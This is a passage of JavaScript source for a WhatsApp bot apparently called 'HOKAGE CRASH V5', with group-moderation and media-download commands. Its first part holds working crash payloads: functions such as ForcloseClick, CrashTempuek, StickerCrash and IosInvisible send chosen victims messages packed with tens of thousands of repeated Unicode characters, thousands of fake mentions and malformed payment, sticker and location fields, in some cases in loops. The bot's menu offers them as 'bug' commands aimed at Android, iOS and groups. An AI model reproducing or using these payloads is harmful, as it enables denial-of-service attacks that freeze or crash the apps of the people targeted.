          messageVersion: 3,
          buttons: [
          {
          name: "single_select",
          buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(15000), id: null })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(30000), id: null })
        },
{
          name: "review_and_pay",
          buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(30000) })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: "ꦾ".repeat(30000),
            flow_id: "yeah, i know, i'm not perfect...",
            flow_message_version: "9",
            flow_token: "ПӨΣƧZYЦI! —"
          })
        }, 
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(15000), id: null })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(15000), id: null })
        },
        {
          name: "review_and_pay",
          buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(30000) })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: "ꦾ".repeat(30000),
            flow_id: "yeah, i know, i'm not perfect...",
            flow_message_version: "9",
            flow_token: "ПӨΣƧZYЦI! —"
          })
        }
          ], 
        },
        contextInfo: {
          remoteJid: "status@broadcast",
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `88888888${i + 0}@s.whatsapp.net`),
          stanzaId: null,
          participant: "0@s.whatsapp.net",
          isForwarded: true,
          forwardingScore: -1,
          quotedMessage: {
            extendedTextMessage: { text: "ꦾ".repeat(10000), jpegThumbnail: null }
          }
        }
      }
      }
      }
    }, { messageId: null });
  }
}

async function ForcloseClick(minato, target) {
  const delay = ms => new Promise(res => setTimeout(res, ms));

  try {
    for (let i = 0; i < 50; i++) {

      await minato.sendMessage(target, {
        requestPaymentMessage: {
          currencyCodeIso4217: "IDR",
          amount1000: 10000 * 1000,
          requestFrom: target,
          noteMessage: {
            extendedTextMessage: {
              text: "ENAK GA BANG WKWK" + "ꦽ".repeat(5000)
            }
          },
          expiryTimestamp: Math.floor(Date.now() / 1000) + 3600,
          amount: {
            value: 10000,
            offset: 1000,
            currencyCode: "IDR"
          },
          background: { id: "default" }
        },
        paymentLinkMetadata: {
          title: "CRIMSON" + "ꦽ".repeat(90000),
          subtitle: "𝑅𝑖𝑑𝑧𝑧",
          currencyCode: "IDR"
        }
      });

      await minato.sendMessage(target, {
        location: {
          degreesLatitude: -6.200000,
          degreesLongitude: 106.816666,
          name: "Lokasi",
          address: "Indonesia"
        }
      });

      await delay(1000);
    }

  } catch (err) {
    console.error(err);
  }
}

async function CrashTempuek(minato, target) {
  const quotedios = {
    key: {
      remoteJid: "13135559098@s.whatsapp.net",
      participant: "13135559098@s.whatsapp.net",
      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
    },
    message: {
      buttonsResponseMessage: {
        selectedButtonId: "x",
        type: 1,
        response: {
          selectedDisplayText: '\n'.repeat(50000)
        }
      }
    }
  };

  const mentions = Array.from({ length: 1000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net');

  let message = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
        header: {
          title: "kimiro" + "ꦾ".repeat(60000),
          hasMediaAttachment: false
        },
        body: {
          text: "kimiro"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_link",
              buttonParamsJson: JSON.stringify({
                paymentLinkMetadata: {
                  url: "kimiro" + "0".repeat(10000),
                  title: "kimiro" + "ꦾ".repeat(60000),
                  description: "ꦸ".repeat(50000)
                }
              })
            }
          ]
        },
        contextInfo: {
          remoteJid: "status@broadcast",
          participant: "6281933605296@s.whatsapp.net",
          isForwarded: true,
          forwardingScore: 250208,
          mentionedJid: mentions,
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 3153600000
            }
          }
        }
   }
      }
    }
  }, { userJid: target, quoted: quotedios });

  await minato.relayMessage(target, message.message, {
    messageId: message.key.id,
    statusJidList: [target]
  });
}

async function StickerCrash(minato, target) {
  await minato.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",

        name: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        packDescription: "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(10000),

        stickers: [
          createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"),
          createSticker("KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp"),
          createSticker("wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp"),
          createSticker("jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp"),
          createSticker("ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp"),
          createSticker("1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp"),
          createSticker("3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp"),
          createSticker("1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp"),
          createSticker("5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp"),
          createSticker("3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp")
        ],

        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        mediaKeyTimestamp: "1741150286",

        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",

        trayIconFileName:
          "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc",

        thumbnailSha256:
          "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

        thumbnailEncSha256:
          "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

        thumbnailHeight: 252,
        thumbnailWidth: 252,

        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

        stickerPackSize: "999999999",
        stickerPackOrigin: "1",

        contextInfo: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000 // 21 days
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
              creatorName: "Bot"
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

async function IosInvisible(minato, target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      };

      let extendMsg = {
         extendedTextMessage: { 
            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            matchedText: ".welcomel...",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      };
      
      let msg1 = generateWAMessageFromContent(target, {
         viewOnceMessage: { message: { locationMessage } }
      }, {});
      
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: { message: { extendMsg } }
      }, {});

      for (const msg of [msg1, msg2]) {
         await minato.relayMessage('status@broadcast', msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
               tag: 'meta',
               attrs: {},
               content: [{
                  tag: 'mentioned_users',
                  attrs: {},
                  content: [{
                     tag: 'to',
                     attrs: { jid: target },
                     content: undefined
                  }]
               }]
            }]
         });
      }
      
   } catch (err) {
      console.error(err);
   }
};
// ================= ANTILINK DETECTOR FUNCTION =================//
async function checkAntiLink(minato, m) {
    if (!m.isGroup) return;
    if (!global.antilink) return;
    if (isAdmins) return; // Admins can send links
    if (isCreator) return; // Owner can send links
    
    const linkRegex = /(https?:\/\/)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/gi;
    
    if (linkRegex.test(body)) {
        // Delete the message
        try {
            await minato.sendMessage(m.chat, { delete: m.key });
        } catch (e) {}
        
        // Add warning
        let groupWarnings = global.warnings[m.chat] || {};
        groupWarnings[m.sender] = (groupWarnings[m.sender] || 0) + 1;
        global.warnings[m.chat] = groupWarnings;
        
        let warnCount = groupWarnings[m.sender];
        
        if (warnCount >= 3) {
            try {
                await minato.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                await minato.sendMessage(m.chat, {
                    text: `┌⪼❏ USER KICKED
├◆ @${m.sender.split('@')[0]}
├◆ Reason: Sending links (3/3)
├◆ Links are not allowed!
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
                    mentions: [m.sender]
                });
                delete groupWarnings[m.sender];
                global.warnings[m.chat] = groupWarnings;
            } catch (e) {}
        } else {
            await minato.sendMessage(m.chat, {
                text: `┌⪼❏ ANTILINK WARNING ${warnCount}/3
├◆ @${m.sender.split('@')[0]}
├◆ Links are not allowed!
├◆ Message deleted
├◆ ${3 - warnCount} warnings until kick
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
                mentions: [m.sender]
            });
        }
    }
}
//============= ( Case commands ) =======\\
switch (command ) {

case "menu": case "minato": {
await minato.sendMessage(m.chat, {react: {text: '⌛', key: m.key}})
await minato.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await minato.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
let Menu = `
┌⪼❏ ʙᴏᴛ ɪɴғᴏ
├◆ ᴄʀᴇᴀᴛᴏʀ: </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅
├◆ ʙᴏᴛ ɴᴀᴍᴇ: 𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻
├◆ ᴠᴇʀ𝚜ɪᴏɴ: v5.0.0
├◆ 𝚜ᴛᴀᴛᴜ𝚜: ᴀᴄᴛɪғ
├◆ ʀᴜɴᴛɪᴍᴇ: ${runtime(process.uptime())}
├◆ ᴘʀᴇғɪx: мᴜʟᴛɪ ᴘʀᴇғɪx
└ ❏

┌⪼❏ ʙᴜɢ ᴍᴇɴᴜ
├◆ ᴄʀᴀsʜ-ᴀɴᴅʀᴏ
├◆ ᴅᴇʟᴀʏ-ᴀɴᴅʀᴏ
├◆ ғᴄ-ᴀɴᴅʀᴏ
├◆ ᴇxᴘʟᴏɪᴛ-ɪᴏs
├◆ ᴄʀᴀsʜ-ɢᴄ
└ ❏

┌⪼❏ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
├◆ ᴀᴅᴅᴘʀᴇᴍ
├◆ ᴅᴇʟᴘʀᴇᴍ
├◆ sᴇʟғ
├◆ ᴘᴜʙʟɪᴄ
├◆ ᴘɪɴɢ
├◆ ʀᴇsᴛᴀʀᴛ
├◆ ʀᴇǫᴜᴇsᴛ
├◆ ᴜᴘᴅᴀᴛᴇ
├◆ ᴀᴜᴛᴏᴛʏᴘɪɴɢ
├◆ ᴀᴜᴛᴏᴠɪᴇᴡsᴛᴀᴛᴜs
├◆ ᴇɴᴄ
└ ❏

┌⪼❏ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
├◆ ᴀɴᴛɪʟɪɴᴋ ᴏɴ/ᴏғғ
├◆ ᴍᴜᴛᴇ
├◆ ᴜɴᴍᴜᴛᴇ
├◆ ᴛᴀɢᴀʟʟ
├◆ ʜɪᴅᴇᴛᴀɢ
├◆ ᴋɪᴄᴋ
├◆ ᴀᴅᴅ
├◆ ᴘʀᴏᴍᴏᴛᴇ
├◆ ᴅᴇᴍᴏᴛᴇ
├◆ ɢᴄʟɪɴᴋ
├◆ ʀᴇᴠᴏᴋᴇ
├◆ ɢʀᴏᴜᴘɪɴғᴏ
├◆ ᴅᴇʟᴇᴛᴇ
├◆ ᴡᴀʀɴ
├◆ ʀᴇsᴇᴛᴡᴀʀɴ
├◆ ᴄʜᴇᴄᴋᴡᴀʀɴ
└ ❏

┌⪼❏ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ
├◆ ᴘʟᴀʏ
├◆ ʏᴛᴍᴘ𝟹
├◆ ʏᴛᴍᴘ𝟺
├◆ ᴛɪᴋᴛᴏᴋ
├◆ ɪɴsᴛᴀ
├◆ ғʙ
├◆ ᴛᴡɪᴛᴛᴇʀ
├◆ sᴘᴏᴛɪғʏ
├◆ ᴘɪɴᴛᴇʀᴇsᴛ
├◆ ᴍᴇᴅɪᴀғɪʀᴇ
├◆ ᴍᴏᴠɪᴇ
├◆ sᴀᴠᴇsᴛᴀᴛᴜs
└ ❏

┌⪼❏ ᴏsɪɴᴛ/sᴛᴀʟᴋ ᴍᴇɴᴜ
├◆ ᴄᴇᴋɪᴅᴄʜ
├◆ ɢɪᴛʜᴜʙsᴛᴀʟᴋ
├◆ ɢʜʀᴇᴘᴏ
├◆ ɢʜsᴇᴀʀᴄʜ
└ ❏

┌⪼❏ ᴏᴛʜᴇʀ ᴍᴇɴᴜ
├◆ sᴜᴘᴘᴏʀᴛ
├◆ ᴏᴡɴᴇʀ
├◆ ᴄʟᴇᴀʀʙᴜɢs
└ ❏

> 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 </> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅`;
await minato.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/s51p6p.jpg" },
caption: Menu
}, { quoted: HKQuoted });
}
break;
// ================= PLAY (Search & Download MP3) ======================
case 'play': {
    if (!text) return reply(`┌⪼❏ PLAY MUSIC
├◆ Please provide a song name
├◆ USAGE: .play P.I.M.P
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        
        let searchRes = await axios.get(`https://api.vreden.my.id/api/ytsearch?query=${encodeURIComponent(text)}`);
        let searchData = searchRes.data;
        
        if (!searchData.result || searchData.result.length === 0) {
            return reply(`┌⪼❏ NO RESULTS
├◆ No songs found for: ${text}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
        
        let video = searchData.result[0];
        let videoUrl = video.url;
        
        reply(`┌⪼❏ SONG FOUND
├◆ Title: ${video.title}
├◆ Channel: ${video.author.name}
├◆ Duration: ${video.duration}
├◆ Views: ${video.views}
├◆
├◆ Downloading MP3...
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        
        let downloadRes = await axios.get(`https://api.vreden.my.id/api/ytplaymp3?url=${encodeURIComponent(videoUrl)}`);
        let downloadData = downloadRes.data;
        
        if (!downloadData.result || !downloadData.result.download || !downloadData.result.download.url) {
            return reply(`┌⪼❏ ERROR
├◆ Failed to download audio
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
        
        await minato.sendMessage(m.chat, {
            audio: { url: downloadData.result.download.url },
            mimetype: 'audio/mp4',
            fileName: `${video.title}.mp3`,
            caption: `┌⪼❏ MP3 DOWNLOADED
├◆ Title: ${video.title}
├◆ Channel: ${video.author.name}
├◆ Duration: ${video.duration}
├◆ Size: ${downloadData.result.size}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
        }, { quoted: m });
        
        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (err) {
        console.error('Play error:', err);
        reply(`┌⪼❏ ERROR
├◆ Failed to download audio
├◆ Please try again
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= YTMP3 ======================
case 'ytmp3': {
    if (!text) return reply(`┌⪼❏ YTMP3
├◆ Please provide a YouTube URL
├◆ USAGE: .ytmp3 https://youtube.com/watch?v=xxxxx
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        
        let res = await axios.get(`https://api.vreden.my.id/api/ytplaymp3?url=${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (!data.result || !data.result.download || !data.result.download.url) {
            return reply(`┌⪼❏ ERROR
├◆ Failed to download audio
├◆ Check the URL and try again
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
        
        await minato.sendMessage(m.chat, {
            audio: { url: data.result.download.url },
            mimetype: 'audio/mp4',
            fileName: `${data.result.title}.mp3`,
            caption: `┌⪼❏ MP3 DOWNLOADED
├◆ Title: ${data.result.title}
├◆ Size: ${data.result.size}
├◆ Type: MP3 Audio
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
        }, { quoted: m });
        
        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch {
        reply(`┌⪼❏ ERROR
├◆ Failed to download YouTube audio
├◆ Please try again later
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= YTMP4 ======================
case 'ytmp4': {
    if (!text) return reply(`┌⪼❏ YTMP4
├◆ Please provide a YouTube URL
├◆ USAGE: .ytmp4 https://youtube.com/watch?v=xxxxx
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        
        let res = await axios.get(`https://api.vreden.my.id/api/ytplaymp4?url=${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (!data.result || !data.result.download || !data.result.download.url) {
            return reply(`┌⪼❏ ERROR
├◆ Failed to download video
├◆ Check the URL and try again
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
        
        await minato.sendMessage(m.chat, {
            video: { url: data.result.download.url },
            caption: `┌⪼❏ MP4 DOWNLOADED
├◆ Title: ${data.result.title}
├◆ Size: ${data.result.size}
├◆ Quality: ${data.result.quality}
├◆ Type: MP4 Video
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`
        }, { quoted: m });
        
        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch {
        reply(`┌⪼❏ ERROR
├◆ Failed to download YouTube video
├◆ Please try again later
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= MOVIE DOWNLOAD ======================
case 'movie':
case 'movies':
case 'film': {
    if (!text) return reply(`┌⪼❏ MOVIE SEARCH
├◆ Please provide a movie name
├◆ USAGE: .movie Avengers Endgame
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    try {
        await minato.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        
        let res = await axios.get(`https://api.vreden.my.id/api/moviesearch?query=${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (!data.result || data.result.length === 0) {
            return reply(`┌⪼❏ NO RESULTS
├◆ No movies found for: ${text}
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
        }
        
        let movie = data.result[0];
        
        let result = `┌⪼❏ MOVIE INFO
├◆ Title: ${movie.title || 'Unknown'}
├◆ Year: ${movie.year || 'Unknown'}
├◆ Rating: ${movie.rating || 'N/A'}
├◆ Genre: ${movie.genre || 'Unknown'}
├◆ Duration: ${movie.duration || 'Unknown'}
├◆ Description: ${movie.description ? movie.description.slice(0, 200) + '...' : 'No description'}
├◆
├◆ Download Links:
├◆ ${movie.download_url || 'Not available'}
├◆
├◆ Use .dlmovie <url> to download
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`;
        
        if (movie.poster || movie.thumbnail) {
            await minato.sendMessage(m.chat, {
                image: { url: movie.poster || movie.thumbnail },
                caption: result
            }, { quoted: m });
        } else {
            reply(result);
        }
        
        await minato.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (err) {
        console.error('Movie error:', err);
        reply(`┌⪼❏ ERROR
├◆ Failed to search for movie
├◆ Please try again later
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    }
}
break;

// ================= ANTILINK TOGGLE ======================
case 'antilink': {
    if (!m.isGroup) return reply(`┌⪼❏ GROUP ONLY
├◆ This command can only be used in groups
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    if (!isAdmins) return reply(`┌⪼❏ ACCESS DENIED
├◆ Only group admins can toggle antilink
└ ❏ Powered by ꪶ ¡ϻ Nᴜʟʟ ꫂ`);
    
    if (args[0] === 'on') {
        global.antilink = true;
        reply(`┌⪼❏ ANTILINK
├◆ Status: ON
├◆ All links will be deleted
├◆ Users sending links will be warned/kicked
